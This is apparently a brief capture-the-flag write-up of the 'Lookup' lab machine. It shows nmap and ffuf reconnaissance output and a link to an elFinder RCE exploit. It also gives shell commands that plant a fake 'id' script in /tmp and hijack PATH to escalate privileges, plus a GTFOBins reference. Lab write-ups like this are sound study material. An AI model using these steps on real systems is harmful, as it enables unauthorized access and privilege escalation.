# Lookup

#Linux #PHP #PrivEsc 

## Reconnaissance

I started running nmap and I got the result:

```
$ nmap -sV -sC 10.65.189.97
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 05:07 -0500
Nmap scan report for lookup.thm (10.65.189.97)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e:20:b1:56:74:61:40:09:ea:e5:da:e2:7d:5b:48:4e (RSA)
|   256 ed:6e:58:2e:f4:2f:8d:4f:28:ff:ac:f6:26:45:88:f5 (ECDSA)
|_  256 0f:7b:4b:0c:78:02:11:2f:aa:28:53:da:54:a6:e9:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I used ffuf 

```
$ ffuf -u http://lookup.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lookup.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
login.php               [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 2367ms]
index.php               [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 2367ms]
.                       [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 133ms]
styles.css              [Status: 200, Size: 687, Words: 95, Lines: 51, Duration: 133ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htm                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htpasswds              [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htgroup                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
wp-forum.phps           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htaccess.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htuser                 [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.htc                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
.ht                     [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 132ms]
:: Progress: [17129/17129] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```


<figure><img src="lookup-1.png" alt=""><figcaption></figcaption></figure>


```
10.66.165.76    lookup.thm
10.66.165.76    files.lookup.thm
```


```
https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce
```



```
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
```



```
 export PATH=/tmp:$PATH
```


https://gtfobins.github.io/gtfobins/look/